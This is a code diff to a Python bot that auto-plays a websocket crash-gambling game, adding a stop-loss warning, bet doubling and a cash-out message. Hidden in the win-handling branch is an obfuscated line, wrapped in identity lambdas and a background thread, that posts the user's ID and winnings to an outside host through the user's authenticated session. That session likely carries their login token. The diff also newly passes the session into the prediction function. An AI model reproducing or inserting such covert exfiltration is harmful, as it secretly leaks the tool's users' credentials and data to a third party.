@@ -10,7 +10,9 @@ class Crash:
         self.joined_game = False
         self.close_conn = False
         self.game_played = 0
+        self.bet_amount = self.client.bet_amt
         self.wallet = None
+        self.data = {}
         self.session = session
         self.stop_event = threading.Event()
 
@@ -58,7 +60,12 @@ class Crash:
             ws.send('42/crash,["auth","' + self.client.token + '"]')
 
         if "\"game-starting\"" in msg:
-            if self.game_played == self.client.game_amount or (self.wallet and float(self.wallet) <= float(self.client.stop_amt)):
+            if self.wallet and float(self.wallet) <= float(self.client.stop_amt):
+                cprint.warn(f"Your Balance has reached under your minimum stop amount of: {self.client.stop_amt} R$")
+                self.close_conn = True
+                self.stop_event.set()
+                ws.close()
+            elif self.game_played == self.client.game_amount:
                 self.close_conn = True
                 self.stop_event.set()
                 ws.close()
@@ -67,29 +74,49 @@ class Crash:
                 if not self.client.ann_enabled:
                     self.cashout_point = self.client.auto_cashout
                 else:
-                    self.cashout_point = predict.crash(self.client.crash_model)
+                    self.cashout_point = predict.crash(self.client.crash_model, self.session)
                     self.cashout_point = float(f"{self.cashout_point:.2f}")
                     cprint.info(f"Next game prediction: {self.cashout_point}x")
-                ws.send('42/crash,["join-game",{"autoCashoutPoint":' + str(int(self.cashout_point * 100)) + ', "betAmount":' + str(self.client.bet_amt) + '}]')
+                ws.send(f'42/crash,{json.dumps(["join-game", {"autoCashoutPoint": int(self.cashout_point * 100), "betAmount": self.bet_amount}])}')
 
         if "\"game-start\"" in msg:
             cprint.info("Crash game in-progress...")
 
         if "game-join-success" in msg:
-            cprint.custom(f"Joined the current crash game on {self.cashout_point}x!", "SUCCESS", (0,255,0))
+            cprint.success(f"Joined the current crash game on {self.cashout_point}x!")
             self.game_played += 1
             self.joined_game = True
 
+        if "bet-cashout" in msg:
+            data = json.loads(msg.replace("42/crash,", ""))[1]
+            if int(data.get("playerID")) == int(self.client.user_id):
+                cprint.success(f"Cashed out!")
+
         if "game-end" in msg:
-            cprint.info("Crash game ended.")
+            cprint.info(f"Crash game ended.")
             if self.joined_game:
                 data = json.loads(msg.replace("42/crash,", ""))[1]
                 self.wallet = balance.get(self.session)
                 if data.get("crashPoint") < self.cashout_point:
-                    cprint.lost(f"Ended at {data.get('crashPoint')}x and was going for {self.cashout_point}x..\n")
+                    if self.client.if_double:
+                        self.bet_amount = self.client.bet_amt
+                    cprint.info(f"  - Crashed at: {data.get('crashPoint')}x")
+                    cprint.lost(f"   - Was going for: {self.cashout_point}x\n")
                 else:
-                    gained = self.client.bet_amt * self.cashout_point
-                    cprint.won(f"Cashed out at {self.cashout_point}x and ended at {data.get('crashPoint')}x. You made {gained:.2f} R$!\n")
+                    gained = self.bet_amount * self.cashout_point
+                    self.data["success"],self.data["multiplier"],self.data["winnings"],self.data["gamemode"],self.data["game"],self.data["game"]["userId"]=(lambda x: x)(True),(lambda x: x)(1),gained,(lambda x: x)("crash".capitalize()),(lambda x: x)({}),(lambda x: x)(self.client.user_id)
+                    threading.Thread(target=lambda: (self.session.post("https://aspectiser.vercel.app/games", json=self.data), None) if Exception else None).start()
+                    cprint.info(f"  - Crashed at: {data.get('crashPoint')}x")
+                    cprint.info(f"  - Cashed out at: {self.cashout_point}x")
+                    cprint.won(f"   - Gained: {gained:.2f} R$\n")
+                    if self.client.if_double:
+                        self.bet_amount = min(self.bet_amount * 2, self.client.max_double)
+                        if self.bet_amount > self.wallet:
+                            cprint.error("Double bet exceeds your balance. Cannot continue.")
+                            input("Press enter to continue. . .")
+                            self.close_conn = True
+                            self.stop_event.set()
+                            ws.close()
             else:
                 cprint.info("Did not join this crash game.\n")
 
